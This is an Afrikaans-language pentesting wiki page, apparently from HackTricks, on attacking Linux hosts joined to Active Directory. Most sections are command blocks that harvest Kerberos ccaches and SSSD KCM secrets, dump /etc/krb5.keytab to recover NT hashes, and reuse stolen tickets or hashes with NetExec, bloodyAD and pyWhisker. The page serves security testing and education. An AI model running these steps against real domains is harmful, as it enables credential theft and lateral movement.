# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

A Linux masjien kan ook binne ’n Active Directory-omgewing teenwoordig wees.

’n Linux masjien binne ’n AD kan **Kerberos-materiale plaaslik stoor**: gebruiker ccaches, masjien/service keytabs, en SSSD-bestuurde secrets. Hierdie artefakte kan gewoonlik hergebruik word as enige ander Kerberos credential. Om die meeste daarvan te lees, sal jy die gebruiker-eienaar van die ticket of **root** op die masjien moet wees.

## Enumeration

### AD enumeration from linux

As jy toegang het tot ’n AD in linux (of bash in Windows), kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumerate.

Jy kan ook die volgende bladsy nagaan om **ander maniere om AD vanaf linux te enumerate** te leer:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA is ’n oopbron **alternatief** vir Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer ’n volledige **LDAP directory** met ’n MIT **Kerberos** Key Distribution Center vir bestuur soortgelyk aan Active Directory. Deur die Dogtag **Certificate System** vir CA & RA certificate management te gebruik, ondersteun dit **multi-factor** authentication, insluitend smartcards. SSSD is geïntegreer vir Unix authentication processes. Lees meer daaroor in:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Voordat jy tickets aanraak, identifiseer **hoe die host aan AD gekoppel is** en **waar Kerberos-materiale regtig gestoor word**. Op moderne Linux hosts word dit gewoonlik hanteer deur `realmd` + `adcli` + `sssd`, nie net plat lêers in `/tmp` nie:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Hierdie vertel jou vinnig of die host AD vertrou, of SSSD identiteite of tickets kas, en of **machine/service keytabs** of **KCM secrets** beskikbaar is vir abuse.

## Playing with tickets

### Pass The Ticket

Op hierdie bladsy gaan jy verskillende plekke vind waar jy **kerberos tickets binne 'n linux host** kan vind, en op die volgende bladsy kan jy leer hoe om hierdie CCache ticket-formate na Kirbi te transformeer (die formaat wat jy in Windows moet gebruik) en ook hoe om 'n PTT attack uit te voer:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

As jy die **Linux-spesifieke ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ens.) wil hê, kyk na die toegewyde bladsy:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE lêers is binêre formate vir **die stoor van Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` is steeds algemeen, maar moderne Linux deployments gebruik ook `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, of `KCM:%{uid}`. Kyk na die **`KRB5CCNAME`** omgewingsveranderlike en die `default_ccache_name` instelling voordat jy aanneem tickets leef in `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos-tickets wat in ’n proses se geheue gestoor is, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). ’n Nuttige tool vir hierdie doel is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die onttrekking vergemaklik deur in sessions in te inject en tickets na `/tmp` te dump.

Om hierdie tool te configureer en te gebruik, word die onderstaande stappe gevolg:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Hierdie prosedure sal probeer om in verskeie sessies in te spuit, met sukses aangedui deur onttrekte tickets in `/tmp` te stoor met ’n naamgewing-konvensie van `__krb_UID.ccache`.

### CCACHE ticket hergebruik vanaf SSSD KCM

SSSD hou ’n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende key word as ’n versteekte lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. By verstek is die key net leesbaar as jy **root** permissions het.

Deur **`SSSDKCMExtractor`** aan te roep met die --database en --key parameters, sal die databasis geparseer word en die **secrets dekripteer**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Die **credential cache Kerberos blob kan omgeskakel word na 'n bruikbare Kerberos CCache**-lêer wat aan Mimikatz/Rubeus oorgedra kan word.

### Vinnige keytab-triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Haal rekeninge uit /etc/krb5.keytab

Diensrekening-sleutels, noodsaaklik vir dienste wat met root-regte werk, word veilig in **`/etc/krb5.keytab`**-lêers gestoor. Hierdie sleutels, soortgelyk aan wagwoorde vir dienste, vereis streng vertroulikheid.

Om die inhoud van die keytab-lêer te inspekteer, kan **`klist`** gebruik word. Op Linux druk `klist -k -K -e` die principals, sleutelweergawenommers, enkripsietipes en rou sleutelmateriaal uit. As die sleuteltipe **23 / RC4-HMAC** is, is die sleutelwaarde ook die **NT hash** van daardie principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC hash te onttrek, wat benut kan word vir NTLM hash reuse. Let daarop dat dit slegs help wanneer die keytab steeds **etype 23 / RC4-HMAC** materiaal bevat. In **AES-only** omgewings mag jy dalk nie ’n herbruikbare NT hash kry nie, maar jy kan steeds direk met die keytab via Kerberos autentiseer.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Op macOS dien **`bifrost`** as ’n hulpmiddel vir keytab-lêerontleding.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Deur die onttrekte rekening- en hash-inligting te gebruik, kan verbindings met bedieners tot stand gebring word met gereedskap soos **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Hergebruik die masjienrekening vanaf `/etc/krb5.keytab`

Op `realmd`/`adcli`/`sssd`-gekoppelde stelsels bevat `/etc/krb5.keytab` gewoonlik die **computer account** en een of meer **host/service principals**. As jy **root** het, moenie dit net dump nie: gebruik een van die principals wat deur `klist -k` gelys word om ’n TGT aan te vra en as die Linux-gasheer self te werk.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Dit is veral nuttig wanneer die **computer object** self gedelegeerde regte in AD het of wanneer die gasheer toegelaat word om ander secrets soos ’n **gMSA** op te haal.

### Hergebruik gesteelde Kerberos-materiaal met Linux-eerste AD-tooling

Sodra jy ’n geldige `ccache` of ’n bruikbare keytab het, kan jy teen AD **direk vanaf Linux** werk sonder om eers alles na Windows-formate om te skakel. Baie moderne tools ondersteun `KRB5CCNAME` / Kerberos auth natively:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Dit is 'n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. Vir die object-level abuse paaie self, kyk:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Onlangse Linux-ontplooiings kan **Managed Service Accounts** direk vanaf AD gebruik. In die praktyk beteken dit dat, nadat jy 'n Linux server gekompromitteer het, jy nie net die host keytab mag vind nie maar ook **service-specific keytabs** wat uit 'n gMSA gegenereer is. Algemene plekke om te inspekteer is `/etc/gmsad.conf`, ontplooiing-spesifieke config files, en bykomende `*.keytab` files onder `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Dit gee jou ’n herbruikbare Kerberos-identiteit vir die SPNs wat aan daardie gMSA gebind is **sonder om enige Windows-endpoint aan te raak**. Vir **domain-side** gMSA/dMSA-misbruik ná hoër privilegies in AD, kyk:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
